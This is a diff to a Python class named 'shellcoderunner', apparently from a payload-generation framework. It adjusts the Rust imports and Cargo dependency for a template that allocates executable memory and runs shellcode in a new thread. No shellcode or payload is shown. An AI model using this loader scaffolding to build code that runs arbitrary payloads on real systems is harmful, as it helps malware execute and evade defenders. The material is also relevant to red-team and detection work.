@@ -1,20 +1,20 @@
 class shellcoderunner:
 
     def imports(self):
-        return ["extern crate winapi;"]
+        return ['extern crate winapi;', 
+                'use winapi::um::memoryapi::VirtualAlloc;', 
+                'use winapi::um::processthreadsapi::CreateThread;', 
+                'use winapi::um::synchapi::WaitForSingleObject;', 
+                'use winapi::um::winnt::{MEM_COMMIT, PAGE_EXECUTE_READWRITE};'
+                'use std::ptr::null_mut;'
+        ]
 
     def compilerOptions(self):
-        return []
+        return ['winapi = {version = "0.3.9", features = ["winnt", "synchapi", "memoryapi", "processthreadsapi"]}']
 
     def template(self):
         return """
 {imports}
-
-use winapi::um::memoryapi::VirtualAlloc;
-use winapi::um::processthreadsapi::CreateThread;
-use winapi::um::synchapi::WaitForSingleObject;
-use winapi::um::winnt::{{MEM_COMMIT, PAGE_EXECUTE_READWRITE}};
-use std::ptr::null_mut;
 
 {codeblocks}
 
